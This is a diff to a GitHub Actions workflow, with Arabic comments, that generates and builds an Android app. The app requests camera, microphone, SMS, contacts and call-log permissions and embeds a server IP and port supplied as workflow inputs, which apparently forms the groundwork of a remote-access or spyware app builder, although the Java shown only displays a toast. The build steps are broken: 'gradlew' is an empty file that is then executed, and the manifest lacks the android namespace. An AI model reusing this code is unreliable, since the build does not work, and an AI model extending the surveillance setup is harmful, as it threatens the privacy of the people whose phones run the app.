@@ -19,33 +19,53 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v3
 
-      - name: Setup Java 11 (مش 17)
+      - name: Set up JDK
         uses: actions/setup-java@v3
         with:
-          distribution: 'temurin'
           java-version: '11'
+          distribution: 'temurin'
 
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      - name: Download Android Platform 30
+      - name: Create project files
         run: |
-          echo y | sdkmanager "platforms;android-30"
-          echo y | sdkmanager "build-tools;30.0.3"
-
-      - name: Create Android project structure
-        run: |
-          # إنشاء هيكل المشروع بالكامل
-          mkdir -p app/src/main/java/com/example/app
-          mkdir -p app/src/main/res/layout
-          mkdir -p app/src/main/res/values
-          mkdir -p app/src/main/res/drawable
+          # إنشاء ملفات المشروع الأساسية (Gradle)
+          cat > settings.gradle << 'EOF'
+          rootProject.name = 'MyApp'
+          include ':app'
+          EOF
           
-          # إنشاء AndroidManifest.xml
+          mkdir -p app
+          cat > app/build.gradle << 'EOF'
+          apply plugin: 'com.android.application'
+          
+          android {
+              compileSdkVersion 30
+              buildToolsVersion "30.0.3"
+              
+              defaultConfig {
+                  applicationId "com.example.myapp"
+                  minSdkVersion 21
+                  targetSdkVersion 30
+                  versionCode 1
+                  versionName "1.0"
+              }
+          }
+          
+          dependencies {
+              implementation 'com.android.support:appcompat-v7:28.0.0'
+          }
+          EOF
+          
+          mkdir -p app/src/main/java/com/example/myapp
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/layout
+          
+          # AndroidManifest.xml
           cat > app/src/main/AndroidManifest.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-              package="com.example.app">
+          <manifest package="com.example.myapp">
               <uses-permission android:name="android.permission.INTERNET"/>
               <uses-permission android:name="android.permission.CAMERA"/>
               <uses-permission android:name="android.permission.RECORD_AUDIO"/>
@@ -53,24 +73,20 @@ jobs:
               <uses-permission android:name="android.permission.READ_SMS"/>
               <uses-permission android:name="android.permission.READ_CONTACTS"/>
               <uses-permission android:name="android.permission.READ_CALL_LOG"/>
-              <application
-                  android:label="My App"
-                  android:icon="@drawable/ic_launcher">
-                  <activity
-                      android:name=".MainActivity"
-                      android:exported="true">
+              <application android:label="MyApp">
+                  <activity android:name=".MainActivity">
                       <intent-filter>
-                          <action android:name="android.intent.action.MAIN" />
-                          <category android:name="android.intent.category.LAUNCHER" />
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
                       </intent-filter>
                   </activity>
               </application>
           </manifest>
           EOF
           
-          # إنشاء MainActivity.java
-          cat > app/src/main/java/com/example/app/MainActivity.java << 'EOF'
-          package com.example.app;
+          # MainActivity.java مع تضمين IP
+          cat > app/src/main/java/com/example/myapp/MainActivity.java << 'EOF'
+          package com.example.myapp;
           import android.app.Activity;
           import android.os.Bundle;
           import android.widget.Toast;
@@ -80,56 +96,50 @@ jobs:
                   super.onCreate(savedInstanceState);
                   String serverIP = "${{ github.event.inputs.server_ip }}";
                   String serverPort = "${{ github.event.inputs.server_port }}";
-                  Toast.makeText(this, "Server: " + serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
+                  Toast.makeText(this, serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
               }
           }
           EOF
           
-          # إنشاء ic_launcher.xml
-          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
-          <?xml version="1.0" encoding="utf-8"?>
-          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
-              <background>
-                  <shape android:shape="oval">
-                      <solid android:color="#3F51B5"/>
-                  </shape>
-              </background>
-          </adaptive-icon>
+          # build.gradle root
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  jcenter()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:4.2.2'
+              }
+          }
+          
+          allprojects {
+              repositories {
+                  google()
+                  jcenter()
+              }
+          }
           EOF
+          
+          # Gradle wrapper
+          mkdir -p gradle/wrapper
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-6.7.1-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          
+          # gradlew
+          touch gradlew
+          chmod +x gradlew
 
-      - name: Build APK with Java 11 and d8
-        run: |
-          # 🔥 إستخدام Java 11
-          mkdir -p build/classes
-          mkdir -p build/apk
-          
-          # تجميع ملفات جافا
-          javac -source 1.8 -target 1.8 \
-            -cp $ANDROID_SDK_ROOT/platforms/android-30/android.jar \
-            -d build/classes \
-            app/src/main/java/com/example/app/*.java
-          
-          # تحويل classes إلى dex بإستخدام d8
-          $ANDROID_SDK_ROOT/build-tools/30.0.3/d8 \
-            --lib $ANDROID_SDK_ROOT/platforms/android-30/android.jar \
-            --output build/ \
-            build/classes/com/example/app/*.class
-          
-          # تجميع الموارد
-          $ANDROID_SDK_ROOT/build-tools/30.0.3/aapt package -f \
-            -M app/src/main/AndroidManifest.xml \
-            -S app/src/main/res \
-            -I $ANDROID_SDK_ROOT/platforms/android-30/android.jar \
-            -F build/apk/app-unaligned.apk \
-            build/classes.dex
-          
-          # نسخ الملف النهائي
-          cd build/apk
-          mv app-unaligned.apk app.apk
-          cp app.apk ../../app-debug.apk
+      - name: Build APK with Gradle
+        run: ./gradlew assembleDebug
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
           name: app-debug
-          path: app-debug.apk
+          path: app/build/outputs/apk/debug/app-debug.apk
